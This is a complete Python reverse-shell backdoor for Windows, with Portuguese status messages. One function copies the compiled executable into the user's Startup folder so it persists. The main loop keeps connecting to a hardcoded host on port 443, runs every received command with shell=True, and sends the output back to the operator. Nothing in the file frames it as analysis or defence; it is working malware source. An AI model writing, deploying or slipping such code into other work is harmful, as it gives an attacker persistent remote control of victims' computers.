import socket
import time
import subprocess
import threading
import os

IP = "192.168.0.12"
PORT = 443


def autorun():
    filename = os.path.basename(__file__)
    exe_filename = filename.replace(".py", ".exe")
    os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"".format(exe_filename))


def connect(ip, port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((ip, port))
        return client
    except Exception as ex:
        print(ex)


def listen(client):
    try:
        while True:
            data = client.recv(1024).decode().strip()
            print(data)
            if data == "/exit":
               return
            else:
                threading.Thread(target=cmd, args=(client, data)).start()
    except Exception as ex:
        client.close()
        print(ex)
        
   

def cmd(client, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
    except Exception as ex:
        print(ex)


if __name__ == "__main__":
    autorun()
    while True:
        client = connect(IP, PORT)
        if client:
            print("Conectado a {}:{}".format(IP, PORT))
            listen(client)
        else:
            print("Erro na conexão. Tentando novamente...")
            time.sleep(5)
